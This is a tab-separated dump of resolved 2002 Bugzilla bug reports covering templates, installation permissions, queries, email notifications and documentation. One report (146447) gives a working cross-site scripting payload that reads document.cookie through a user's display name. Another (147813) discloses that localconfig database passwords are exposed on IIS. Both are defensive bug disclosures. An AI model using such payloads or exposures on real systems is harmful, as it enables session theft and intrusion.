143574%TAB%1021041522%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General,bugzilla.org,Bugzilla-General%TAB%file error - cache failed to write [foo].tmpl: Permission denied%TAB%file error - cache failed to write [foo].tmpl: Permission deniedThis is because the following are all true:  1) a webservergroup isn't set 2) the user running checksetup isn't the same as the user the webserver runs as 3) a template file changed without rerunnning checksetup.  The causes the template compilation code to try to recompile, but since the webserver doesn't have write access to that directory, it fails.  Note that this does not require root access; if teh template files are up to date, then the webserver doesn't need write access. Its tsep 3 which is important.  -> bugzilla.org so that justdave reruns checksetup on that directory.  The alternate fix is to make the data/template dirs world writable for teh non-webservergroup case. People were against me doing that, but given how much else has to be world writable if you don't set up a webservergroup, world writable templates are the least of our worries...
143586%TAB%1021052293%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%required modules tests should be sorted%TAB%required modules tests should be sortedRecently, the 'what modules do we have to install' test was moved into a hash. As a result, the order is changed, and so the AppConfig test comes after the Tempalte test. Since we adde the appconfig test there only because TT's CPAN module stuff was wrong, this seems like a bad idea.
143604%TAB%1021064604%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%format=html not supported%TAB%format=html not supportedSince our files aren't called foo-html.html.tmpl, a format of 'html' fails, giving the error:  "The html output format is not supported by this script. Supported formats (besides the default HTML format) are simple, rdf."  This error is silly, as we do. If html really is the default, then we should check for html earlier.
143650%TAB%1021084103%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%General template display system%TAB%General template display systemI have a need to serve a mostly-static page, but I want it to have Bugzilla headers and footers. I anticipate that other Bugzilla installations may want to do this - for policy documents, or other information.  Bugzilla should have a generic template display CGI, which takes a single parameter, being a tag for the template to display.  http://bugzilla.mozilla.org/display.cgi?page=account-policy  display.cgi would quietly_check_login, and then display the template which corresponds to the tag "account-policy". This template would get anything that is always added to $vars (such as user_agent) and would be able to add the Bugzilla header and footer.  (Other implementation options include - the page parameter being a full template path; but this allows people to display arbitrary templates, so is probably a bit insecure - the page parameter being a full template name, and the templates always being in one particular directory. This avoids the above problem, but may stop you putting your template with associated other templates in the filesystem.)
143743%TAB%1021110013%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Warning generated in dependency tree%TAB%Warning generated in dependency treeThe dependency tree template generates a warning because not all dependencies have dependencies themselves, and there is one condition in display_tree block which doesn't check for this. The warning message:  Argument "" isn't numeric in numeric gt (>) at  data/template/en/default/bug/dependency-tree.html.tmpl line 284 (#1) (W  numeric) The indicated string was fed as an argument to an operator that  expected a numeric value instead. If you're fortunate the message will identify  which operator was so unfortunate. [Sat May 11 19:00:28 2002] 
143826%TAB%1021142672%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Add support for Insiders, Private comments, Private Attachments%TAB%Add support for Insiders, Private comments, Private AttachmentsIn environments where a development team is supporting multiple customers, each sharing some of their own bugs with the development team and also interested in tracking bugs the development team is working on, some finer-grain access controls are needed to prevent cross-contamination.  I am in the process of implementing (hacking, really) the following changes...  #1 is nearly done and will soon have a patch (my first) for the whole world to throw rocks at.  #2 is in planning.  Beyond that is more sketchy.  1) New parameter - "insidergroup" naming a group whose members are considered insiders.  Members of this group can mark any comment private.  Comments marked private will not be visible to any user not part of "insidergroup" and email notifications to non-insiders will be supressed when the associated comment is private. (for simplicity, auto-generated comments about duplicate bugs and attachments are  considered private -- this may change later)  2) New attribute of a project -- "inside"     If a project is flagged as "inside" then no non-insiders may edit any bugs while they are in that project, even if the bug is public and/or they are on the CC list.   If a project is non-"inside", then all bugs in that project will be forced to be in that project's group.  3) Limit visibility of email addresses and assignees by non-insiders.  Exact rules TBD (suggestions anyone??)
143847%TAB%1021157816%TAB%45772%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bug_email failure - unable to find Token.pm%TAB%bug_email failure - unable to find Token.pmOne thing to note here is that the email scripts (bug_email and  bugzilla_email_append) run with different permissions than the rest of bugzilla  (and the same for the charting cronjob).  You may want to check the permissions  of Token.pm to make sure that it can be ran by your mail server as well as your  web server.
144022%TAB%1021224375%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%CPAN's website has error in link to Text::Wrap 2001%TAB%CPAN's website has error in link to Text::Wrap 2001The following recent exchange occured on netscape.public.mozilla.webtools, and is probably worth a note in the install docs in the section on obtaining Perl modules:  On 5/13/02 11:43 AM +1000, Ellison, Martin [IT] wrote:  > Thanks for the reply. But sorry, by CPAN I meant the web site e.g. > http://search.cpan.org/search?mode=module&query=Text%3A%3AWrap. The CPAN > module doesn't work for me (security). > > I found File::Spec at http://www.cpan.org/modules/by-module/File/. > > But I can't find Text::Wrap 2001. Where is it?  Same difference. :)  If it's in the CPAN module, it's on their website. Looks like CPAN's website has a bug dealing with distributions that have a "+" in the name though.  I had to manually change the + in the URL to a %2B to get it to work. 
144091%TAB%1021256792%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%old-params.txt need to be in .cvsignore%TAB%old-params.txt need to be in .cvsignorechecksetup.pl create a file named old-param.txt to store parameters removed  from localconfig. this file need to be in .cvsingore
144165%TAB%1021270747%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%enter_bug product selection has a footer like without logins,enter_bug product selection has a footer like without a login if no usebuggroupsentry%TAB%enter_bug product selection has a footer like without logins,enter_bug product selection has a footer like without a login if no usebuggroupsentryWhen selecting "enter a new bug" causes the product list to appear. On that page the footer looks just like the user had not logged in at all. This is because the user data hasn't been retrieved for that page. Note that this occurs only if usebuggroupsentry param is off. 
144285%TAB%1021298104%TAB%18194%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%checksetup.pl fails to set data dir (and other dir) permissions properly%TAB%checksetup.pl fails to set data dir (and other dir) permissions properlyOn a clean installation (tar xzvf) of 2.61rc1, I do the following (Debian woody):  # checksetup.pl (localconfig created) # vi localconfig (edit bug db password, change $webservergroup to www-data) # checksetup.pl  (finish setup)  Now, when I access index.cgi, I get the following error:  Software error: Can't create data/params.22949 at defparams.pl line 59.  Looking at the data directory, it's owned by root:root, mode 771.  This probably explains the problem.
144565%TAB%1021378541%TAB%52846%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%describecomponents.cgi shows wrong components when user has access to only one product%TAB%describecomponents.cgi shows wrong components when user has access to only one productI am using bugzilla 2.15.  There are a lots of products and users inside the database. When a user has  access to only one product (through buggroups), then the describecomponents.cgi  referenced from the main query page shows wrong components (from a completely  another product).  If the user is a member of more that one product, everything displayed  correctly.   Is it a template problem or something else?
144728%TAB%1021428491%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Midair collision doubles line feeds%TAB%Midair collision doubles line feedsWhen submitting comment changes after midair collision confirmation, linefeeds are doubled.  Steps:  1) Pick a bug and make some modifications, submit them 2) Hit back 3) Add a comment with linefeeds 4) Submit. Midair collision screen should pop up.  5) Submit the changes anyway.   Now go back to the bug and see what happened: the linefeeds are doubled.  I managed to repeat this on an almost fresh CVS pull running under Win2k, but not on landfill's bugzilla-tip. I will investigate further soon, but marking WinNT for now.
144768%TAB%1021442206%TAB%15462%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Selecting multiple products on query page causes script error in IE%TAB%Selecting multiple products on query page causes script error in IEWhen selecting multiple products on the query page in Bugzilla 2.16rc1, the  following script error occurs in IE:  Line 170 'undefined' is null or not an object  Tested in IE6.0 and IE5.0 at http://landfill.bugzilla.org/bugzilla- tip/query.cgi.  No errors seen when using Mozilla or NS4.x.  This error does not occur in the 2.15 version running on b.m.o.
144818%TAB%1021457207%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,bugzilla.org%TAB%Put coding standards in the Developers Guide,Put coding standards in the Developers' Guide.%TAB%Put coding standards in the Developers Guide,Put coding standards in the Developers' Guide.Our coding standards are silent on the naming of things, and we therefore have several inconsistent styles. We've done the good work for Bugzilla readability by mandating a consistent brace style. I think we should build on this by saying how we name things.  The following suggestions are based on what is current practice in the majority of our code:  - db field names should be lower-case and with words concatenated together, e.g. linkinfooter. - In general, if a variable represents a DB field, it should have the same name (or the plural form, if it's several of them.) The same applies to form fields. This has great advantages for code reuse and generalisation. - This rule may be broken on rare occasions for template variables, where dejargonification and understandability are paramount.  - variables, including template variables, should be all lower-case, and underscore_separated if separators are required. e.g. var show_bug; - CGI parameters should also be all lower-case, but word are simply concatenated together, e.g. &rescanall=1. - Functions should use StudlyCaps, with a leading capital. e.g. SendSQL(). (There is a dichotomy here; another valid choice would be as variables - lower-case and underscore_separated. But I suggest there's value in having them different from variables.). - Filehandles should be ALLCAPS.  There are already rules for template naming. New CGI names should also follow this rule - lower-case, and hyphen separated.  Existing code shouldn't be changed to conform to this standard unless it's being spanked already.
145030%TAB%1021532089%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%verify-new-product template uses cgi.pm?%TAB%verify-new-product template uses cgi.pm?The problem I encountered first is that the TT's use clause in verify-new-product.html.tmpl seems to freeze in my Win32/IIS5 installation, causing a CGI timeout. That's a problem in itself, one which has to be examined closer if the following one isn't solved.  The more interesting question: why is cgi.pm used here, and if this is intentional, should we require it in checksetup.pl?
145113%TAB%1021556376%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%describecomponents.cgi doesn't call quietly_check_login().%TAB%describecomponents.cgi doesn't call quietly_check_login().and so the footer is the same as a logged out footer.
145255%TAB%1021613850%TAB%51772%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User,Documentation,Bugzilla Helper,Bugzilla-General%TAB%Tasks | Tools | Javascript Console%TAB%Tasks | Tools | Javascript ConsoleFrom Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.0rc2) Gecko/20020514 BuildID:    2002051406  In this Bugzilla helper page, one wrote "You can often see if you have a problem ... by opening the Javascript Console (Tasks | Tools | Javascript Console)". Being a (Windows rather litterate) end-user, I dont' understand how to perform the above. Is this just for java developers ?  Reproducible: Always Steps to Reproduce: Visit the page  Actual Results:  I skipped this paragraph  Expected Results:  Reader should be informed if he as a pure Windows end-user is concerned or not by this procedure.
145588%TAB%1021781348%TAB%52137%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Search query formation requires expert <i>a priori</i> knowledge of reported bugs,Search query formation requires expert a priori knowledge of reported bugs,Search query formation requires expert a priori knowledge of reported bugs - should support fulltext indexes%TAB%Search query formation requires expert <i>a priori</i> knowledge of reported bugs,Search query formation requires expert a priori knowledge of reported bugs,Search query formation requires expert a priori knowledge of reported bugs - should support fulltext indexesWhen searching the database for existing bug reports a user has to formulate their searches such that all possible variants of their search terms are included. If searching for errors with table presentation under Show All Tags or for searching for "aminated gif" the user has to enter prefixes rather than natural language terms. For example with "animated" the user is forced to remember that this must be searched for as "animat" in case someone enter "animation" instead of "animated". These are simple cases and have lead to duplicate entries being made.  Bugzilla requires a thesaurus or controlled vocabulary feature provided by the better text retrieval systems. So when the user enters "animated" a search is made for "animated or animation or animate" depending upon what Use For/Related  terms are entered for animated/animation.
145702%TAB%1021870886%TAB%53468%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%error occurs on intial access of query.cgi in 2.16RC1,query.cgi doesn't always ConnectToDatabase() early enough%TAB%error occurs on intial access of query.cgi in 2.16RC1,query.cgi doesn't always ConnectToDatabase() early enoughIf the query.cgi is accessed before an intial login has occured (on a web  browser users computer) of a bugzilla installation (in 2.16RC1), a "Software  error" is generated.  Software error:  Can't call method "prepare" on an undefined value at globals.pl line 270.  This problem goes away once a login has occured. (Then, it doesn't matter then whether the user is logged in or out after that initial login)
145795%TAB%1021898264%TAB%37693%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%editcomponents use the term product where component should be used%TAB%editcomponents use the term product where component should be usedIn editcomponents.cgi there are a couple of uses of the term 'product' where 'component'  is intended. eg.             print "Sorry, I can't delete the product name."; and         print "Updated product name.<BR>\n";
145849%TAB%1021914779%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Non-maintainers with ability to bless others need "users" link in footer%TAB%Non-maintainers with ability to bless others need "users" link in footerNon-maintainers who have been granted the ability to enable particular  permissions for other users need a link to the editusers.cgi script from their  page footer.
146087%TAB%1022005548%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration,Email Notifications%TAB%'sendmailnow' should be on by default.%TAB%'sendmailnow' should be on by default.I'm pretty sure we currently ship with the 'sendmailnow' parameter off.  Given this is a performance enhancement most installations won't need, it can cause confusion (bug #141874), and problems with Sendmail clones, I don't see any reason we shouldn't ship with it being defaulted on.
146091%TAB%1022009337%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Sort order for votes is ascending instead of descending.%TAB%Sort order for votes is ascending instead of descending.When you choose to sort on votes by clicking on the column heading on buglist.cgi, it ends up sorting in ascending order rather than descending order as you would expect.  I believe this is a regression, as it works on mozilla.org.
146104%TAB%1022013661%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%Move localconfig enumerations into database.%TAB%Move localconfig enumerations into database.We need to move the localconfig enumerations out of localconfig and into the database.  This will allow:  - Editing through the web interface using my new administration architecture. - Other things to be attached to them, such as sortkeys and isactive flags.
146134%TAB%1022027096%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup.pl gives weird error message.%TAB%checksetup.pl gives weird error message.Checking user setup ...  Warning: you have entered a value for the "webservergroup" parameter in localconfig, but you are not running this script as root. This can cause permissions problems and decreased security.  If you experience problems running Bugzilla scripts, log in as root and re-run this script, or remove the value of the "webservergroup" parameter. Note that any warnings about "uninitialized values" that you may see below are caused by this.  Content-type: text/html  <H1>Software error:</H1> <PRE>Couldn't rmdir attachment: Permission denied </PRE> <P> For help, please send mail to this site's webmaster, giving this error message  and the time and date of the error.  [Wed May 22 18:46:06 2002] checksetup.pl: Couldn't rmdir attachment: Permission denied
146162%TAB%1022038231%TAB%12816%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Ability to reference users by their real names%TAB%Ability to reference users by their real namesIt is very convinient for small bugzillas to reference users in CC, assigned to and similar fields just by their real names. Together with option to display realnames in buglist, it is a big advancement of UI
146261%TAB%1022066839%TAB%8028%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%Email not sent to uses on CC list under some Status field transitions,Email not sent to users on CC list under some Status field transitions%TAB%Email not sent to uses on CC list under some Status field transitions,Email not sent to users on CC list under some Status field transitionsI'm using a CVS snapshot of Bugzilla updated on 22 May 2002, around 12:00 EST.  I have a user with the following email settings: - Only email reports of changes by others                                                  - All relationships for 'Priority, status, severity, and/or milestone changes' - All relationships for 'The bug is resolved or verified' All other email settings are turned off.  This user is on the CC list for a bug.  When the bug is RESOLVED, the user gets email.  If the bug is then CLOSED, they don't get email, but should since the status field has changed.  If the bug is then REOPENED they also don't get email, but should for the same reason.  I have a patch for this problem against revision 1.81 (the head at the time of this report) of processmail which I will try to attach to this bug after submitting it.
146447%TAB%1022136000%TAB%53423%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%cross-site scripting bug with bugzilla user's name%TAB%cross-site scripting bug with bugzilla user's nameI changed my full name to <b>Jan!</b> and that worked (as in: bold font). Similary, when I changed it to  Jan! <script>alert("XSS: see bug #!\n\n" + document.cookie)</script>  that ran the script without a hitch. This is a simple way to steal people's cookies, and should be avoided, by escaping/"de-HTML-ing" any and all user input.
146679%TAB%1022202775%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Reusable (structured?) schema.,Reusable (structured?) database-independent schema.,Reusable, structured, database-independent schema%TAB%Reusable (structured?) schema.,Reusable (structured?) database-independent schema.,Reusable, structured, database-independent schemaThe current schema in checksetup.pl would be useful for other things.  For example, foreign key references could be used by sanity check, as well as bug deletion, to automatically work out subsidiary tables.  To do this we need to include foreign key references.  That should not be difficult, you add "PRIMARY KEY(fieldname)" to the tables, and then elsewhere REFERENCES tablename to the end of the field line.  Now they may not be enforced in MySQL (that is bug #109473), but it would mean these references would be centralised.for the various purposes they can be used for.  Now to get this information back it would be necessary to parse the schema, and that's too complicated.  Therefore it would be better for the schema to be structured and deparsed when used in checksetup.  An additional benefit would be you wouldn't need to specify the field type information when adding a field during an upgrade, just the field name, and you look up the field type from the schema (and avoid potential bugs if it was inconsistent between the schema and the upgrade code).
146865%TAB%1022240753%TAB%54158%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%bugzilla.org%TAB%landfill.bugzilla.org is down...%TAB%landfill.bugzilla.org is down...this is really a test bug to familiarize myself w/ the UI...although, i did try  going to landfill.bugzilla.org as a sandbox and didn't get a valid response
146945%TAB%1022261319%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%clean up format ambiguities%TAB%clean up format ambiguitiesThe concept of formats is ambiguous because it represents two kinds of variations in appearance: structural (f.e. classic and modern versions of the query form) and representational (f.e. HTML and RDF versions of bug lists).  All structural variations *have* a representation (i.e. content type), but all representational variations *are* a representation, which leads to confusion about how users should request variations.  Structural and representational variations should be disambiguated from each other by distinguishing between the two in filenames and URL/form parameters via the following scheme:  Variations in structure are called "formats."  Each format has a unique name, and the name of a template file implementing a format consists of the name of the script (or equivalent identifier) followed by a dash, the format name, a period, the filename extension representing the format's content type, another period, and the "tmpl" extension, f.e.:   foo-classic.html.tmpl foo-modern.html.tmpl  Formats may be specified by users via the "format" URL/form parameter.  Variations in representation are called "content types."  Each content type has a unique extension, and the name of a template file implementing a content type consists of the name of the script (or equivalent identifier), followed by a period, the extension, another period, and the "tmpl" extension, f.e.:  bar.html.tmpl bar.xml.tmpl  Content types may be specified by users via the "ctype" URL/form parameter.  Scripts may support both kinds of variations, in which case the "format" parameter takes precedence over the "ctype" parameter.  Scripts may not implement both kinds of variations in a single file, at least not until someone implements a data structure for storing variations that indexes them by both format name and extension (there is no need for this now, and it's unclear that there ever will be, but the scheme above does not do anything to prohibit its implementation if anyone ever discovers a reason to do it).  Bugzilla should fail gracefully when it cannot find the requested variation. Bugzilla should have ways for installations and users to specify default variations.
147136%TAB%1022366887%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Template Customisation Section Issues%TAB%Template Customisation Section IssuesThe following appears to possibly need doing, looking through the template customisation section:  Say that what you edit depends on how you upgrade.  If you purely use cp (ie you download tarballs), then custom is always the right option.  Add a comment to say if you are making changes that will be submitted back to Bugzilla, please read the Developers' Guide first.  How does the enter_bug format template know which post_bug template to call?  Didn't we include formats for post_bug?  These aren't documented.  Add a comment mentioning that custom will always work unless there are incompatible template interface changes.  Mention if this occurs it will be mentioned in the release notes (and we should probably talk about versions too for people who pull from CVS which doesn't have the release notes), and there may also have a transition period where the feature is mentioned in the deprecations section in the release notes.
147137%TAB%1022366989%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Bugzilla Guide whole file not updated.%TAB%Bugzilla Guide whole file not updated.The latest Bugzilla Guide does not have an updated one-file version (Bugzilla-Guide.html).  I'm not sure if this is usually updated, but it is out of date in any case and needs to be deleted or (preferably) updated.
147138%TAB%1022367267%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Section on upgrading needs improving.%TAB%Section on upgrading needs improving.The section of the Bugzilla Guide on upgrading Bugzilla needs a bit of improving.  It assumes you're upgrading using CVS.  It should also include instructions about cp and tarballs.  Make sure everything in the release notes upgrading seciton is also included here.  It should probably be moved into its own section, before template customisation, since that section needs to talk about upgrading.
147151%TAB%1022375148%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Checking for mizspelings.,Develop list of words for 006spellcheck.t to look for,Expand the list of words 006spellcheck.t look for; fix the places where they are wrong.%TAB%Checking for mizspelings.,Develop list of words for 006spellcheck.t to look for,Expand the list of words 006spellcheck.t look for; fix the places where they are wrong.We should check the source code for commonly mispelled words such as 'dependancy', 'bugzilla' (lower case), 'arbitary' and so on.  This would pick up everything, comments, variables names, etc.  Hopefully we don't rely on any software or standards that require us to misspell words ('referer' obviously), which would cause problems.  This is only looking for specific words, it is not a dictionary check in any sense, and we certainly wouldn't go looking for spellings that are different between different English dialects.
147272%TAB%1022431193%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%No background for Bugzilla pages.%TAB%No background for Bugzilla pages.The current Bugzilla templates have no background set, which is a regression from 2.14.  In particular the background used to be set to white.  This is not a problem in NGLayout browsers where the default is white, but the default in N4 is grey.  This means this look and feel of Bugzilla has changed on N4.  I suggest we set a default CSS block where style is not passed into the header template, or even better, a default CSS rule that style adds to.
147275%TAB%1022431802%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Rearchitect product groups.%TAB%Rearchitect product groups.The current product group system needs a reachitecture.  It has the following problems:  - You can't share a group between multiple products and update the members in one place. - You can't specify that product groups cannot be removed from any bugs in that product, yet the group will disappear off query, meaning you can possibly see that product on bugs but can't query for it. - You would expect product groups options to be on the products page, not the params page. - If you turn on entry restriction, it must be for all products.  So here's the deal, what I propose:  - Product groups (including entry restriction) are always available for products.  The options disappear off the params page. - Every product has a place where you can specify the product's default groupset, required groupset and entry groupset. - Bugs automatically get the default groupset ORed with the required groupset when reported. - You cannot remove a restriction from a bug if its in the bug's product's required groupset. - You cannot enter a bug into a product unless the user is in the product's entry groupset. - A product will appear on the query, reports screen if the user is in the product's required groupset or entry groupset (because of reporter_accessible). - A product will appear on the entry screen if the user is in the product's entry groupset. - Because you specify gro
147310%TAB%1022449977%TAB%29618%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla Helper,Bugzilla-General%TAB%Bugzilla helper needs updating, causes error on hitting submit%TAB%Bugzilla helper needs updating, causes error on hitting submitSeverity major for this component, I presume. Anyway.  After hitting submit in the helper, get the following: Possible bug database corruption has been detected. Please send mail to endico@mozilla.org with details of what you were doing when this message appeared. Thank you.  src = Account Manager Address Book Attachments BiDi Hebrew & Arabic Composition Filters Import Internationalization LDAP Mail/News Integration Localization Mail Back End Mail Database Mail Notification Mail Window Front End MIME Movemail Networking: IMAP Networking: MailNews General Networking: News Networking: POP Networking: SMTP Offline Printing Profile Migration Return Receipts Search Security: General Simple MAPI Subscribe default = Networking - IMAP  and no bugzilla form.
147476%TAB%1022521278%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%dot .htaccess issues not documented.%TAB%dot .htaccess issues not documented.We need to document that if you change your webdotbase, you may need to alter your web server permissions.  In particular, your .htaccess file might need to be added or recreated.  This should go in defparams.pl so it appears on the parameter.
147479%TAB%1022524007%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Post installation checklist talks about the old template parameters.,Remove all redundant generated doc files before release%TAB%Post installation checklist talks about the old template parameters.,Remove all redundant generated doc files before releaseThe post installation checklist talks about the old template parameters which have become TT templates.  It should talk about the new TT templates.  In particular, it should talk about customising banner.html.tmpl (or header.html.tmpl if it really must).
147480%TAB%1022525715%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Lack of newlines when asking for password in checksetup.pl.%TAB%Lack of newlines when asking for password in checksetup.pl.Enter a password for the administrator account: The password must be 3-16 characters in length.Enter a password for the administrator account:
147776%TAB%1022613934%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%checksetup.pl should re-write localconfig with the current comments%TAB%checksetup.pl should re-write localconfig with the current commentsAs discussed in bug 143108, we sometimes slightly change the definition of a variable in localconfig.  Our current mechanism of writing variables to localconfig doesn't allow us to change the comments on a variable that's already in localconfig.  Changing the default comment only changes the comment on a config that hasn't picked up that variable yet.  The best way to do this is to read in the file, add any defaults that are missing, in memory, then re-write the entire file out with all of the default comments (instead of just appending the new ones to the end).  Need to make sure it's documented at the top of the file that changes to comments will be lost.  Maybe we can provide a way to add comments that won't get lost...  This would also allow us to put them in a specific order in the file, so they can be grouped by function, even if new ones are added later.
147813%TAB%1022633043%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Documentation%TAB%Any Windows/IIS installation automatically reveals the db password%TAB%Any Windows/IIS installation automatically reveals the db passwordOoph. I just realized that any installation running on Win32/IIS automatically reveals the db password to anyone who asks it using a browser, since localconfig is by no means protected (IIS doesn't do .htaccess). Actually, I think the same goes for any other web server without htaccess support, too.   Good ideas, anyone? I think this could be acceptable if we did warn the user about this somewhere (checksetup.pl?), but to avoid annoying the Apache masses we should somehow be able to detect the web server used... Which sounds nigh-impossible to do. A documentation note?
147833%TAB%1022642761%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%Start using CGI.pm%TAB%Start using CGI.pmWe should aim at getting rid of our custom CGI.pl and start using the standard CGI module.
148011%TAB%1022690192%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%put TT pseudo-method additions together in globals.pl%TAB%put TT pseudo-method additions together in globals.plHere's a quick no-brainer.  TT pseudo-method additions should be all together in globals.pl.
148093%TAB%1022727186%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Editmilestones shows 'xyzzy' as the product bug count%TAB%Editmilestones shows 'xyzzy' as the product bug countGo to editmilestones.cgi without a parameter, and you'll see a bug table with bug counts written as 'xyzzy'.    A ridiculously old minor bug, but I'll attach a patch anyway.
148133%TAB%1022738048%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%GetOutputFormats should return formats that don't have an associated content type%TAB%GetOutputFormats should return formats that don't have an associated content typeGetOutputFormats only returns formats for which a content type exists in localconfig.  It should return formats regardless of whether or not a content type exists and rely on the calling code to determine what to do when the user requests a format for which a content type has not been configured (probably alert the user to the problem, since the user is probably the administrator checking out their cool new format in these cases).
148157%TAB%1022742795%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Bad sorting in describecomponents.cgi%TAB%Bad sorting in describecomponents.cgidescribecomponents.cgi sorts improperly. I noticed this after importing our bugzilla database (RH) into the new 2.16 code base. I have a list of several hundred components. There is already an "ORDER BY value" clause in the SELECT statement in describecomponents.cgi that does sorting for you. For some reason the extra sort in the template file components.html.tmpl is causing wierd things with the array reference to the components. Probably has something to with the components array being an array of hash refs. Anyway, removing the sort from the FOR component = components.sort allows the components to display in proper order. Attaching patch fixing problem.
148179%TAB%1022749935%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%parameterize body tag attribute values%TAB%parameterize body tag attribute valuesThe check-in for bug 147272 added the following code to the body tag in header.html.tmpl:  [% "bgcolor=\"#FFFFFF\"" UNLESS body_attributes.search('(?:^|\s)bgcolor=') %]  A better approach would be to make bgcolor a template variable.  Then the code could look like this:  [% DEFAULT bgcolor = "#FFFFFF" %] <body bgcolor="[% bgcolor %]" ...>  The same should be done for the onload attribute, which is currently the only attribute that ever gets passed into header.html.tmpl in the "body_attributes" variable.
148221%TAB%1022759856%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Mention Bugzilla Installer in documentation%TAB%Mention Bugzilla Installer in documentationThe URL given has an installer script for Bugzilla. This should be mentioned in the documentation. It should also possibly be checked into /contrib.
148356%TAB%1022813633%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%contrib/cvs-update.sh should be in Perl%TAB%contrib/cvs-update.sh should be in Perlcvs-update.sh should be rewritten in Perl to make it work on Win32 as well.
148363%TAB%1022818048%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Minor html glitch on the enter_bug template%TAB%Minor html glitch on the enter_bug templateThe enter_bug template has a minor bug: a missing >
